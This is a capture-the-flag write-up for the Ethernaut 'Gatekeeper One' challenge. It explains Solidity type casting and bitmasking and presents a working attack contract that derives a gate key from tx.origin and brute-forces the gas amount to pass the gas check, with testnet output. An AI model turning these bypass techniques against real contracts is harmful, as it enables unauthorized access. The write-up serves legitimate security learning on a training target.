# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Challenge's message:

> Make it past the gatekeeper and register as an entrant to pass this level. - Remember what you've learned from the Telephone and Token levels. - You can learn more about the special function gasleft(), in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

The **GatekeeperOne** contract implements a gatekeeping mechanism that restricts entry to a certain function based on three specific conditions. There is a public address entrant variable that stores the address of the entrant who successfully passes the gatekeeping conditions. Also, we have three modifiers implemented on the **enter()** function: 

### Modifiers

#### gateOne()

This modifier enforces a condition that the *msg.sender* (the caller of the function) is not the same as the *tx.origin* (the origin of the transaction). In other words, it ensures that the function is not called directly but is being called through another contract or function.

#### gateTwo()

This modifier checks if the remaining gas (`gasleft()`) divided by 8191 is equal to zero. It restricts the execution of the function based on the specific gas limit condition.

#### gateThree()

This modifier takes a parameter *_gateKey* of type *bytes8* and enforces three conditions:

- The first condition checks if the first 32 bits of *_gateKey* (converted to *uint64*) is equal to the first 16 bits of *_gateKey*. If they are not equal, it throws an error with the message "GatekeeperOne: invalid gateThree part one". 
- The second condition checks if the first 32 bits of *_gateKey* (converted to *uint64*) is not equal to *_gateKey* itself. If they are equal, it throws an error with the message "GatekeeperOne: invalid gateThree part two".
- The third condition checks if the first 32 bits of *_gateKey* (converted to *uint64*) is equal to the first 16 bits of the *tx.origin* (the origin of the transaction). If they are not equal, it throws an error with the message "GatekeeperOne: invalid gateThree part three".


In the enter() function is the entry point of the contract and is used to gain access based on the gatekeeping conditions. It takes a parameter *_gateKey* of type *bytes8* which is used in the gateThree modifier. The function first applies the *gateOne*, *gateTwo*, and *gateThree* modifiers to enforce the respective conditions. If all the conditions are met, the entrant variable is updated with the *tx.origin* (the origin of the transaction) and the function returns *true*.

It's important to note that the code does not provide any indication of what the gatekeeping conditions are meant to achieve or how they contribute to the functionality or security of the contract.

## Type Casting

Solidity is a statically typed language, so all variables have a fixed type; it is not possible to change the type of the variable after its declaration. This is necessary because state variables have a dedicated space for them in storage. It is possible, however, to convert one type to another. This is called type casting. There are two ways to do this: explicitly and implicitly.

Implicit conversions occur when the expression makes logical sense and there is no loss of information when casting. This may sound arbitrary, but it should become clearer with some examples. 

Let’s say we have two variables, one of type uint8 and one of type uint16. Let’s call them x and y, respectively, for convenience. The variable x accepts values between 0 and 2⁸ — 1, while the variable y accepts values between 0 and 2¹⁶ — 1. Thus, all values accepted by the variable x are also accepted by the variable y, but the reverse is not true. The code below is perfectly logical and there is no information loss.

```solidity
uint8 x = 140;
uint16 y = x; // 140
```


## Explicit Conversions

It is possible to do explicit type conversions in Solidity, but you need to be very careful when doing this. Let’s see an example converting from type int8 to uint8. First, let’s understand how computers represent numbers. Let’s assume that the following 8 bits represents a number: 11111111. What number does it represent? There is no right answer. If it represents an unsigned integer, its decimal value is 255. But if it represents an integer that can be either positive or negative, its decimal value is -1.

Now consider a function with the following body, where we explicitly convert the int type to uint.

```solidity
int8 negative = -1;
return uint8(negative); // return 255
```

The value of the variable negative, in bits, is 11111111, regardless of what it represents. In the case of an unsigner integer, its value is 255. Note that by doing the conversion explicitly, we transform the value of -1 to 255. In the case above, we converted from an 8-bit type to an 8-bit type. We’ve already seen that converting an 8-bit unsigned integer to 16-bit is straightforward, and the conversion is implicit. But is it possible to convert from 16-bit to 8-bit? It is not possible to store a 16-bit value in 8 bits without losing information. It would be like trying to put a large box into a smaller box without folding it.

Consider the 16-bit binary value 0000101000001001. In decimal it is written as 2569. Now let’s do an explicit conversion to uint8. What do you think should be the result?

Only the last 8 bits are kept. The value 0000101000001001 is converted to 00001001, which is 9 in decimal. ***When converting from a larger integer type to a smaller one, the bits on the right are kept while the bits on the left are lost***.


In converting bytes types, the opposite occurs. When a larger byte type is converted to a smaller type, the first bytes are kept and the last ones are lost. ***When converting a smaller byte to a larger byte, null bytes are appended to the right***. Let’s see this in the examples below.

```solidity
bytes4 value = 0x12345678;
bytes1 smallValue = bytes1(value); // 0x12
bytes5 largeValue = value; // 0x1234567800;
```

## Explicit Type Conversions

In solidity, it allows us conversion beetwen different types of variables. In this part, we will focus on conversion beetwen bytes and uint type variables. If you learn more detailly about this topic, you should look at [this article](https://www.geeksforgeeks.org/solidity-conversions/).

Let's consider that we have bytes8 type variable called *data* and we will convert to uint64 and uint32 types.

```solidity

// 1 byte -> 8 bits
// 8 byte -> B1 B2 B3 B4 B5 B6 B7 B8

bytes8 data = 0x1234567891011123;
uint64 newLongData = uint64(data); // 0x1234567891011123
uint32 newShortData = uint32(data); // 0x91011123 - first 8 characters lost
```

As you can see, when the data variable convert to uint64 type, our *data* variable's **value was the same** because the **bytes8 type variable's length was equal to the uint64 type variable's size of 64 bits**. However, we saw **the bytes8 type variable's length doesn't match the uint32 type variable's size**. So the *data* variable had **lost the first eight characters when it converted to uint32 type**.

## Bitmasking

Bitmasking is a technique used in computer programming to manipulate and extract specific bits or groups of bits within a binary number using bitwise operators. It involves setting or clearing individual bits based on a predefined pattern or mask.

In bitmasking, a mask is created by setting specific bits to 1 and leaving others as 0. By applying bitwise operations, such as AND, OR, XOR, and NOT, to a binary number and the mask, specific bits can be extracted, modified, or checked. Common use cases of bitmasking include:

- **Flag Manipulation:** Flags can be represented as individual bits within a bitmask. By performing bitwise operations, specific flags can be set, cleared, or toggled within the bitmask.
- **Permissions and Access Control:** Bitmasks are often used to represent permission sets or access control lists (ACLs). Each bit can represent a specific permission, and bitwise operations can be used to check and modify permissions.
- **Encoding and Decoding:** Bitmasks are used to encode and decode information into compact binary representations. By using specific bits to represent different pieces of information, bitwise operations can be used to extract or combine data.
- **Data Compression:** Bitmasks are used in compression algorithms to efficiently represent data using fewer bits. The presence or absence of specific bits in a bitmask can represent the presence or absence of certain data elements.

Here's an example that demonstrates how bitmasking works:

```solidity
uint8 permissions = 0b10100110;  // Permissions represented as an 8-bit bitmask

uint8 readPermission = 0b00000010;
uint8 writePermission = 0b00000100;
uint8 executePermission = 0b00010000;

// Check if read permission is set
bool hasReadPermission = (permissions & readPermission) != 0;

// Set write permission
permissions |= writePermission;

// Clear execute permission
permissions &= ~executePermission;
```

In this example, we have an 8-bit bitmask representing permissions. We use bitwise **AND (&)** to check if the read permission is set, bitwise **OR (|)** to set the write permission, and bitwise **AND with complement (~)** to clear the execute permission.

Bitmasking allows for efficient storage, manipulation, and extraction of specific bits within a binary representation, enabling developers to perform various operations on individual bits or groups of bits. More about Bitmasking from [here.](https://www.geeksforgeeks.org/what-is-bitmasking/)



# Subverting

In this section, we will bypass the modifiers one by one. For this reason, I split up this cases into to sub texts. 

### gateOne()

This modifier requires the msg.sender is not the same as the tx.origin. That means, we will always pass this condition because of our attack contract calls the enter() function externally.

### gateThree()

This gate quit enjoyable to find out the gateKey. First of all, we should define gateKey as `B1 B2 B3 B4 B5 B6 B7 B8` bit format. Then, we are ready for explict type conversion.

We learned that **when type conversion beetwen bytes8 and uint64 types, there is no data losing**. If you don't know the reason of no data losing, you can read [this part.](https://github.com/wasny0ps/Ethernaut-Challenges/tree/main/Challenges/Gatekeeper%20One#explicit-conversions) In other words, **gateKey's bit format remain same**.

```solidity
bytes8 gateKey = 0xB1B2B3B4B5B6B7B8;
return uint64(gateKey); // 0xB1B2B3B4B5B6B7B8
```

#### Requirement #1

The first condition says, after converting to *_gateKey* variable into uint64 format, the uint32 form of the *_gateKey* variable's value equals the uint16 form of the *_gateKey* variable's value. **That means 5th and 6th bytes of *_gateKey* must be zero**.

```solidity
bytes8 gateKey = 0xB1B2B3B4B5B6B7B8;
uint32 newGateKey1 = uint32(uint64(_gateKey)); // 0xB5B6B7B8
uint16 newGateKey2 = uint16(uint64(_gateKey)); // 0xB7B8

// 0xB5B6B7B8 == 0xB7B8
// There is only one possibility for this situation.         
// 0xB5B6B7B8 = 0x0000B7B8
// B5 B6 => 00 00
```

#### Requirement #2

In the second statement shows us the uint32 form of the *_gateKey*'s value does not equal to uint64 form of the *_gateKey*'s value. **So, the first four bits of *_gateKey* must not be zero**.

```solidity
bytes8 gateKey = 0xB1B2B3B40000B7B8;
uint32 newGateKey1 = uint32(uint64(_gateKey)); // 0x0000B7B8
uint64 newGateKey2 = uint64(_gateKey); // 0xB1B2B3B40000B7B8

// 0x0000B7B8 != 0xB1B2B3B40000B7B8
// This bits may be FF which corresponds to 11111111 in binary format.           
// 0x0000B7B8 != 0xFFFFFFFF0000B7B8
// B1 B2 B3 B4 !=> 00 00 00 00
// B1 B2 B3 B4 ~=> FF FF FF FF
```

#### Requirement #3

In the final check, **the uint32 form of the *_gateKey*'s value equals to uint16 form of transaction origin address**. (***The uint160 variable's size is 20 bytes which is length of an address on ethereum. That's why uint160 form of the tx.origin's value is a numerical representation of address with no data losing***.) In other saying, **7th and 8th bytes of *_gateKey* must be equal to last two bytes of tx.origin address**.

```solidity
bytes8 gateKey = 0xFFFFFFFF0000B7B8;
address txOrigin = tx.origin; // example -> 0x12345678911121314151
uint32 newGateKey = uint32(uint64(_gateKey)); // 0x0000B7B8
uint16 newTxOrigin = uint16(uint160(txOrigin)); // 0x4151

// 0x0000B7B8 == 0x4151
// 0x0000B7B8 == 0x00004151
// B7B8 = 4151
// B7 B8 => last two bytes of tx.origin
```

To sum up:

- `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`: ***This condition ensures that the 5th and 6th bytes of *_gateKey* are zero***. 
- `uint32(uint64(_gateKey)) != uint64(_gateKey)`: ***This condition ensures that the first four bytes of *_gateKey* are not all zeros***.
- `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`: ***This condition ensures that the 7th and 8th bytes of *_gateKey* match the last two bytes of the transaction origin address***.

Thanks to this the results we can calculate *_gateKey* variable's value.

```solidity
bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
```

In this command, we assign tx.origin bytes (because they are not 0) instead of `FF` place with bitmasking method. Thus, we are going to pass all condations in the gateThree() modifier.

### gateTwo()

In this state, we can calculate the gas leave out `gasleft() % 8191 == 0` statement thanks to `(8191*k) + i = gasleft()` formula. You can think that *k* is just a number such as 3 and *i* is number we must find it with brute-force.

```solidity
for(uint i=0; i<300; i++){
            uint totalGas = (8191*3) + i;
            (bool result, ) = address(target).call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result){
                break;
            }
        }
```
In this loop, the program calculate a random gas called **totalGas** and check this value while a low-level call to the enter() function with our gate key from the target contract. If it works, the loop will have ended.


Here is our attack contract.

```solidity
pragma solidity ^0.8.17;

import './GatekeeperOne.sol';

contract Attack{

    GatekeeperOne target;

    constructor(address _target){
        target = GatekeeperOne(_target);
    }

    function attack() external{
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for(uint i=0; i<300; i++){
            uint totalGas = (8191*3) + i;
            (bool result, ) = address(target).call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result){
                break;
            }
        }
    }

}
```

Basically, it gets an target contract's instance and send to *gateKey* enter() function with a low level call after get the correct *totalGas* variable's value. In the long run, we register as an entrant and pass the level. Let's carry out.

First in first, check the entrant variable's value.

```shell
await contract.entrant()
'0x0000000000000000000000000000000000000000'
```

After the deploy our attack contract, let's call attack() function. See in [etherscan](https://sepolia.etherscan.io/tx/0xb28373341fc7cf1eba3ac0c67320cef9928268da033ec62771d2386ff422b8d7).

Finally, check the entrant variable's value again. As you can see, we beat the GatekeeperOne challenge successfully.

```shell
await contract.entrant()
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

```shell
player
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

Ethernaut's message:

> Well done! Next, try your hand with the second gatekeeper...


**_by wasny0ps_**

